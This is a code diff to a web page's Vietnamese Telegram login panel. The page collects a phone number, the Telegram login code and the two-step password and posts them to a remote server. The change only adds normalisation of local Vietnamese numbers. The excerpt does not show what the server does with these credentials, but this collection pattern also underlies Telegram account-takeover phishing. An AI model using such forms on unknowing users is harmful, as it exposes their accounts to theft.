@@ -13130,7 +13130,7 @@ if(document.readyState==="loading")document.addEventListener("DOMContentLoaded",
   const loginArea=document.createElement("div");
   loginArea.hidden=true;loginArea.style.cssText="padding:10px;border:1px solid #cbd5e1;border-radius:8px;margin-top:8px;background:#fff";
   const loginInfo=document.createElement("p");loginInfo.textContent="Nhập số Telegram của chính bạn. Mã xác nhận chỉ sử dụng để đăng nhập tài khoản của bạn.";
-  const phone=document.createElement("input");phone.type="tel";phone.inputMode="tel";phone.autocomplete="tel";phone.placeholder="+849xxxxxxxx";phone.setAttribute("aria-label","Số điện thoại Telegram");phone.style.cssText="display:block;width:100%;margin:8px 0";
+  const phone=document.createElement("input");phone.type="tel";phone.inputMode="tel";phone.autocomplete="tel";phone.placeholder="09xxxxxxxx hoặc +849xxxxxxxx";phone.setAttribute("aria-label","Số điện thoại Telegram");phone.style.cssText="display:block;width:100%;margin:8px 0";
   const code=document.createElement("input");code.type="text";code.inputMode="numeric";code.autocomplete="one-time-code";code.placeholder="Mã Telegram";code.setAttribute("aria-label","Mã Telegram");code.hidden=true;code.style.cssText="width:100%;margin:8px 0";
   const password=document.createElement("input");password.type="password";password.autocomplete="off";password.placeholder="Mật khẩu Telegram 2 bước";password.setAttribute("aria-label","Mật khẩu Telegram 2 bước");password.hidden=true;password.style.cssText="width:100%;margin:8px 0";
   const submit=document.createElement("button");submit.type="button";submit.textContent="Gửi mã Telegram";submit.className="soft";
@@ -13158,7 +13158,15 @@ if(document.readyState==="loading")document.addEventListener("DOMContentLoaded",
     if(busy)return;
     const action=step;
     const payload=action==="start"?{phone:phone.value.trim()}:action==="confirm"?{code:code.value.trim()}:{password:password.value};
-    if(action==="start"&&!/^\+[1-9][0-9]{7,14}$/.test(payload.phone)){feedback.textContent="Nhập số dạng +849xxxxxxxx.";return;}
+    if(action==="start"){
+      // Accept Vietnamese local numbers and E.164; send only normalized E.164 to VPS.
+      const digits=payload.phone.replace(/[\s().-]/g,"");
+      if(/^0\d{9}$/.test(digits))payload.phone="+84"+digits.slice(1);
+      else if(/^84\d{9}$/.test(digits))payload.phone="+"+digits;
+      else payload.phone=digits;
+      if(!/^\+[1-9][0-9]{7,14}$/.test(payload.phone)){feedback.textContent="Nhập số điện thoại hợp lệ, ví dụ 09xxxxxxxx hoặc +849xxxxxxxx.";return;}
+      phone.value=payload.phone;
+    }
     if(action==="confirm"&&!payload.code){feedback.textContent="Nhập mã xác nhận Telegram.";return;}
     if(action==="password"&&!payload.password){feedback.textContent="Nhập mật khẩu xác minh 2 bước.";return;}
     busy=true;submit.disabled=true;feedback.textContent="Đang xác thực an toàn...";
